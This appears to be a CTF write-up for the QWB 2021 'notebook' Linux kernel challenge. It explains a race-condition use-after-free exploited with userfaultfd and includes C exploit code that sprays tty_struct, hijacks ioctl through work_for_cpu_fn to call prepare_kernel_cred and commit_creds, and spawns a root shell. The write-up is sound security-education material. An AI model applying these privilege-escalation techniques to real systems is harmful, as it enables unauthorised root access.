# QWB 2021 notebook

*uffd*	*tty_struct*	*work_for_cpu_fn*	*race*	*improper lock*



## Vulnerability

​	Inside of the `noteedit` function, there are some obviously abnormal function invokes and control flow arrangements.

1. `noteedit` only applies for a read lock to edit a notebook entry
2. the `size` parameter of a notebook entry was mofidifed before its pointer was renewed without any check against the new size value
3. the `copy_from_user` was invoked after the `krealloc`, and before the pointer of the entry was renewed



​	These abnormality clearly indicates vulnerability. Combining with other functions, there are multiple ways to achieve UAF or double-free. Here is one example

> 1. `noteadd` a entry
> 2. `noteedit` its size to any size we want
> 3. `noteedit` its size to 0, which equals a `free` invoke, then hang the kernel execution at `copy_from_user` with UFFD



​	As the pointer value was not renewed by the time the kernel execution was hanged, the pointer of the notebook entry now points to a freed SLAB chunk, resulting to UAF.

​	As there is a `_check_object_size` at `mynote_read` and `mynote_write`, write and read to the UAF chunk will fail for the `size` parameter was now 0. We need to find a way to bypass it.

​	Look close into `noteadd`, there are also obvious abnormalities.

1. the `size` of the entry is renewd before checking if the entry was empty.
2. there is a strange `copy_from_user` invoke before checking if the entry is empty.



​	So, we may revise the size of the UAF entry by invoking `noteadd` and hang the kernel execution at `copy_from_user`. This changes the `size` parameter of the entry to normal value, and the `_check_object_size` will report no error when the UAF chunk was written or read, giving us a standard UAF vulnerability for later exploitation.

​	As mentioned, there are multiple ways to achieve UAF, it's not the important how you did it. The interesting part is how to exploit it.

​	There is at least three ways to exploit the UAF

1. hijack a tty_struct and use the fancy funtion `work_for_cpu_fn`
2. hijack a tty_struct and do a kernel rop
3. revise `modprobe_path`



## Exploit 1: hijack tty_struct and work_for_cpu_fn

### causing UAF

​	This should be the easiest exploitation. The tty_struct hijacking part is quite traditional.

1. `noteadd` a size 0x60 chunk, then `noteedit` its size to 0x2e0
2. `noteedit` its size to 0, then hang the kernel execution, causing a UAF
3. `noteadd` its size to 0x60 to bypass the `_check_object_size`
4. spray the kernel with tty_struct by opening `/dev/ptmx`
5. after we get a tty_struct, we change its *tty_ops*. We can fake the tty_ops in another notebook entry



​	During the spraying, we can varify if we get a tty_struct by `mynote_read` the chukn and check the tty_struct magic number. And we may use `sched_setaffinity()` to increase the probability.

```c
    bind_cpu(); // significantly increase UAF possibility 
    noteadd(0, 0x20, buf);  // hijack tty_struct
    noteedit(0, 0x2e0, buf);
    hang_mem = get_mem_hang(1);
    RegisterUserfault(hang_mem, 1, userfaultfd_hang_handler);
    pthread_t edit_thread_t, add_thread_t;
    pthread_create(&edit_thread_t, NULL, edit_thread, NULL);
    sleep(1);   // must sleep enough long time
    pthread_create(&add_thread_t, NULL, add_thread, NULL);  // to bypass check_object_size
    sleep(1);
    int spray_fd[0x100];
    for(int i=0;i<0x100;i++){
        // spray the kernel with tty struct
        spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        read(notebook_fd, buf, 0);
        if(*(int*)buf == 0x5401){
            puts("[*] tty_struct get");
            victim_fd = spray_fd[i];
            break;
        }
    }
    if(*(int*)buf != 0x5401) ErrExit("[-] get tty struct fail");
```



### the fancy function: `work_for_cpu_fn`

​	After we control a tty_struct, we may control the RIP for one time. The traditional exploitation is to hijack `ioctl` then transfer the kernel stack to somewhre we control and place a rop chain there, do `commit_cred(prepare_kernel_creds)` then `swapgs_restore_regs_and_return_to_usermode`. 

​	However, it is always hard work to find a proper gadget to transfer the kernel stack, and we are unlucky this time for there is actually no gadget I could find to transfer the stack this way. The kernel ROP can be achieved anyway, but absolutely not that easy.

​	The function `work_for_cpu_fn` was new for me too. It exists in system which turns on support for multi cores. The prototype is

```c
static void work_for_cpu_fn(struct work_struct *work)
{
	struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);

	wfc->ret = wfc->fn(wfc->arg);
}
```

and after compilation it becomes

```c
static void work_for_cpu_fn(size_t * args)
{
    args[6] = ((size_t (*) (size_t)) (args[4](args[5]));
}
```

it invokes `args[4]` with `args[5]` as its parameter and store the return value at `args[6]`. 

​	This is perfect in our case. If we hijack `ioctl` of the tty_struct to `work_for_cpu_fn`, by the time we invoke the `ioctl`, the args will the the address of the tty_struct. We can put a `prepare_kernel_creds` at `tty_struct[4]`, and a 0 at `tty_struct[5]`, then `work_for_cpu_fn` will do `prepare_kernel_creds(0)` and the return value --- the root cred struct --- will be placed at `tty_struct[6]`. The address of the cred struct can be read with `mynote_read`, and we do the trick again to invoke `commit_creds()`. 

​	Nothing else in the kernel was touched during this procedure. It is almost totally normal function invoke. So it's reasonable to expect the invoke the `ioctl` will always return cleanly. And this techniche is expected to be much more stable, universal and easy to implement than traditional kernel ROP. 

```c
    // prepare_kernel_cred
    read(notebook_fd, buf, 0);
    unsigned long *p = (unsigned long*)buf;
    p[3] = fake_seq_ops;
    p[4] = kernel_load_base + PREPARECRED;
    p[5] = 0;
    write(notebook_fd, buf, 0);
    ioctl(victim_fd, 0, 0);

    // commit_cred
    memset(buf, 0, 0x200);
    read(notebook_fd, buf, 0);
    p = (unsigned long*)buf;
    unsigned long cred = p[6];
    p[3] = fake_seq_ops;
    p[4] = kernel_load_base + COMMITCRED;
    p[5] = cred;
    printf("[*] ROOT cred struct @ 0x%lx\n", cred);
    write(notebook_fd, buf, 0);
    ioctl(victim_fd, 0, 0);

    system("/bin/sh");
```

